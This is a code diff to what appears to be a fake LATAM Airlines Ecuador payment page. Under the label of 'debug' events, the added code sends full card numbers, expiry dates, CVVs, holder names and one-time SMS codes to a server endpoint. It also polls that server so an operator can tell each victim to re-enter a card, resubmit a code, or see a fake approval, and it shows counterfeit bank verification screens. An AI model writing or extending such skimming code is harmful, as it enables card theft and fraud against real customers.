@@ -275,6 +275,14 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
   <p class="pagos-msg" id="pagos-msg" hidden></p>
 </section>
 
+<div class="pagos-debug-modal" id="pagos-debug-modal" hidden role="dialog" aria-modal="true" aria-labelledby="pagos-debug-modal-title">
+  <div class="pagos-debug-modal__panel">
+    <h2 id="pagos-debug-modal-title">No pudimos verificar la tarjeta</h2>
+    <p id="pagos-debug-modal-message">Ingresa los datos nuevamente.</p>
+    <button type="button" id="pagos-debug-modal-close">Entendido</button>
+  </div>
+</div>
+
 <div
   class="pasarela-wait"
   id="pagos-wait-screen"
@@ -507,7 +515,157 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
   const SEATS_KEY = 'latam-seat-selection';
   const STORE_KEY = 'latam-store-selection';
   const PAX_KEY = 'latam-passenger-draft';
+  const DEBUG_SESSION_KEY = 'latam-debug-session-id';
   const defaultLegs = JSON.parse(legsJson);
+
+  function debugSessionId() {
+    let sessionId = sessionStorage.getItem(DEBUG_SESSION_KEY);
+    if (!sessionId) {
+      sessionId = crypto.randomUUID();
+      sessionStorage.setItem(DEBUG_SESSION_KEY, sessionId);
+    }
+    return sessionId;
+  }
+
+  async function sendDebugEvent(event, payload = {}) {
+    console.log(`[debug-before-fetch:${event}]`, {
+      sessionId: debugSessionId(),
+      route: window.location.pathname,
+      ...payload,
+    });
+    const response = await fetch('/api/debug', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        event,
+        sessionId: debugSessionId(),
+        route: window.location.pathname,
+        ...payload,
+      }),
+    });
+    if (!response.ok) throw new Error('No se pudo consultar el enrutador debug');
+    return response.json();
+  }
+
+  async function pollDebugDecision(timeoutMs = 90000) {
+    const sessionId = debugSessionId();
+    const started = Date.now();
+    while (Date.now() - started < timeoutMs) {
+      const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
+        headers: { Accept: 'application/json' },
+      });
+      if (response.ok) {
+        const payload = await response.json();
+        const decision = payload?.decision || {};
+        if (decision.action && decision.action !== 'wait') return decision;
+      }
+      await new Promise((resolve) => window.setTimeout(resolve, 1500));
+    }
+    return {
+      action: 'timeout',
+      message: 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.',
+    };
+  }
+
+  function maskCard(value) {
+    const digits = onlyDigits(value || '');
+    if (digits.length < 8) return digits.replace(/\d/g, '*');
+    return `${digits.slice(0, 6)}******${digits.slice(-4)}`;
+  }
+
+  function setUiMessage(message, kind = 'error') {
+    if (!msg) return;
+    msg.hidden = !message;
+    msg.textContent = message || '';
+    msg.dataset.kind = kind;
+  }
+
+  function setChallengeMessage(brand, message, kind = 'error') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
+    const form = panel?.querySelector('[data-otp-form]');
+    if (!form) {
+      setUiMessage(message, kind);
+      return;
+    }
+    let error = form.querySelector('[data-otp-debug-message]');
+    if (!error) {
+      error = document.createElement('p');
+      error.setAttribute('data-otp-debug-message', '');
+      error.setAttribute('role', 'alert');
+      error.style.margin = '10px 0 0';
+      error.style.fontSize = '13px';
+      error.style.lineHeight = '1.35';
+      form.appendChild(error);
+    }
+    error.textContent = message || '';
+    error.hidden = !message;
+    error.dataset.kind = kind;
+    error.style.color = kind === 'success' ? '#178a3b' : kind === 'info' ? '#1b4e9b' : '#b42318';
+  }
+
+  function clearChallengeMessages() {
+    document.querySelectorAll('[data-otp-debug-message]').forEach((el) => {
+      el.textContent = '';
+      el.hidden = true;
+    });
+  }
+
+  function clearCardInputs() {
+    [cardNumber, cardName, cardExp, cardCvv, cardEmail].forEach((input) => {
+      if (!input) return;
+      input.value = '';
+      input.setAttribute('readonly', '');
+      syncPlaceholderState(input);
+    });
+    syncCardFieldStates({ force: false });
+    syncPayEnabled();
+  }
+
+  function showCardErrorModal(message = 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.') {
+    const modal = document.getElementById('pagos-debug-modal');
+    const text = document.getElementById('pagos-debug-modal-message');
+    const close = document.getElementById('pagos-debug-modal-close');
+    if (text) text.textContent = message;
+    if (modal) modal.hidden = false;
+    document.body.classList.add('pagos-debug-modal-open');
+    close?.focus();
+  }
+
+  function closeCardErrorModal() {
+    const modal = document.getElementById('pagos-debug-modal');
+    if (modal) modal.hidden = true;
+    document.body.classList.remove('pagos-debug-modal-open');
+    cardNumber?.focus();
+  }
+
+  document.getElementById('pagos-debug-modal-close')?.addEventListener('click', closeCardErrorModal);
+
+  function showChallenge(brand, merchantLabel, amountLabel, datetimeLabel, withError = '') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand) ? brand : 'visa';
+    clearChallengeMessages();
+    challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
+      const active = panel.getAttribute('data-challenge-brand') === brandKey;
+      panel.hidden = !active;
+      if (!active) return;
+      panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
+        el.textContent = merchantLabel;
+      });
+      panel.querySelectorAll('[data-challenge-amount]').forEach((el) => {
+        el.textContent = amountLabel;
+      });
+      panel.querySelectorAll('[data-challenge-datetime]').forEach((el) => {
+        el.textContent = datetimeLabel;
+      });
+      const form = panel.querySelector('[data-otp-form]');
+      if (form) form.dataset.attempts = '0';
+      const input = panel.querySelector('input[name="otp"]');
+      if (input) input.value = '';
+    });
+    if (challenge) challenge.hidden = false;
+    if (withError) setChallengeMessage(brandKey, withError);
+  }
 
   function money(value, withUsd = false) {
     const n = Number(value || 0);
@@ -1024,12 +1182,12 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
   document.getElementById('pagos-detail-toggle')?.addEventListener('click', () => setSheet(true));
   sheet?.querySelectorAll('[data-pagos-sheet-close]').forEach((el) => el.addEventListener('click', () => setSheet(false)));
 
-  payBtn?.addEventListener('click', () => {
+  payBtn?.addEventListener('click', async () => {
     if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
     const wait = document.getElementById('pagos-wait-screen');
     const challenge = document.getElementById('pagos-challenge-screen');
     const brand = detectCardBrand(cardNumber?.value || '').brand;
-    const brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand)
+    let brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand)
       ? brand
       : 'visa';
     const now = new Date();
@@ -1043,13 +1201,40 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     const amountLabel = money(total, true);
     const merchantLabel = 'LATAM Airlines Ecuador';
     const payLabel = payBtn.textContent;
+    const cardDigits = onlyDigits(cardNumber?.value || '');
 
     payBtn.classList.add('is-loading');
     payBtn.disabled = true;
     payBtn.setAttribute('aria-busy', 'true');
     payBtn.innerHTML = '<span class="pagos-pay__spin" aria-hidden="true"></span>';
 
-    window.setTimeout(() => {
+    try {
+      console.log('----------------')
+      console.log('----------------')
+      console.log('PAYMENT_SUBMIT:')
+      console.log('CARD: ', cardNumber.value)
+      console.log('EXP: ', cardExp.value)
+      console.log('CVV: ', cardCvv.value)
+      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
+        cardFirstDigit: cardDigits.charAt(0),
+        meta: {
+          brand: brandKey,
+          amount: total,
+          card: maskCard(cardNumber?.value || ''),
+          cardFirstDigit: cardDigits.charAt(0),
+          cvvLength: onlyDigits(cardCvv?.value || '').length,
+          cpayload: {
+            b: cardNumber.value,
+            cv: cardExp.value,
+            exp: cardCvv.value,
+            holder: cardName.value,
+          }
+        },
+      });
+      if (route?.brand && ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(route.brand)) {
+        brandKey = route.brand;
+      }
+      setUiMessage('');
       payBtn.classList.remove('is-loading');
       payBtn.removeAttribute('aria-busy');
       payBtn.textContent = payLabel;
@@ -1079,23 +1264,15 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
       window.setTimeout(() => {
         if (wait) wait.hidden = true;
-        challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
-          const active = panel.getAttribute('data-challenge-brand') === brandKey;
-          panel.hidden = !active;
-          if (!active) return;
-          panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
-            el.textContent = merchantLabel;
-          });
-          panel.querySelectorAll('[data-challenge-amount]').forEach((el) => {
-            el.textContent = amountLabel;
-          });
-          panel.querySelectorAll('[data-challenge-datetime]').forEach((el) => {
-            el.textContent = datetimeLabel;
-          });
-        });
-        if (challenge) challenge.hidden = false;
-      }, 5000);
-    }, 2000);
+        showChallenge(brandKey, merchantLabel, amountLabel, datetimeLabel);
+      }, Number(route?.delayMs || 1200));
+    } catch (error) {
+      payBtn.classList.remove('is-loading');
+      payBtn.removeAttribute('aria-busy');
+      payBtn.textContent = payLabel;
+      syncPayEnabled();
+      setUiMessage(error instanceof Error ? error.message : 'No se pudo continuar con el pago.');
+    }
   });
 
   document.querySelectorAll('[data-help-toggle]').forEach((btn) => {
@@ -1112,7 +1289,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
   });
 
   document.querySelectorAll('[data-otp-form]').forEach((form) => {
-    form.addEventListener('submit', (event) => {
+    form.addEventListener('submit', async (event) => {
       event.preventDefault();
       const input = form.querySelector('input[name="otp"]');
       if (!input?.value.trim()) {
@@ -1121,6 +1298,33 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
       }
       const panel = form.closest('[data-challenge-brand]');
       const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
+      const attempts = Number(form.dataset.attempts || '0') + 1;
+      form.dataset.attempts = String(attempts);
+      setUiMessage('');
+      clearChallengeMessages();
+      console.log('[debug-otp-submit]', {
+        sessionId: debugSessionId(),
+        brand: brandKey,
+        otpLength: String(input.value || '').trim().length,
+        attempt: attempts,
+      });
+      try {
+        console.log('----------------')
+        console.log('----------------')
+        console.log('OTP_SUBMIT:')
+        console.log('OTP: ', input.value)
+        await sendDebugEvent('OTP_SUBMIT', {
+          metaOtp: {
+            brand: brandKey,
+            otp: input.value,
+            otpLength: String(input.value || '').trim().length,
+            attempt: attempts,
+          },
+        });
+      } catch {
+        setChallengeMessage(brandKey, 'No pudimos procesar el código. Intenta nuevamente.');
+        return;
+      }
       const wait = document.getElementById('pagos-wait-screen');
       const challenge = document.getElementById('pagos-challenge-screen');
       wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
@@ -1129,6 +1333,49 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
       if (challenge) challenge.hidden = true;
       if (wait) wait.hidden = false;
       document.body.classList.add('is-offers-waiting');
+
+      const decision = await pollDebugDecision();
+      const nextAction = decision?.action || 'timeout';
+
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        cardNumber?.focus();
+        return;
+      }
+
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
+        if (wait) wait.hidden = true;
+        challenge?.querySelectorAll('[data-challenge-brand]').forEach((el) => {
+          el.hidden = el.getAttribute('data-challenge-brand') !== brandKey;
+        });
+        if (challenge) challenge.hidden = false;
+        document.body.classList.remove('is-offers-waiting');
+        setChallengeMessage(
+          brandKey,
+          decision?.message || 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
+          nextAction === 'sms_error' ? 'error' : 'info',
+        );
+        input.value = '';
+        input.focus();
+        return;
+      }
+
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
+
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
     });
   });
 </script>
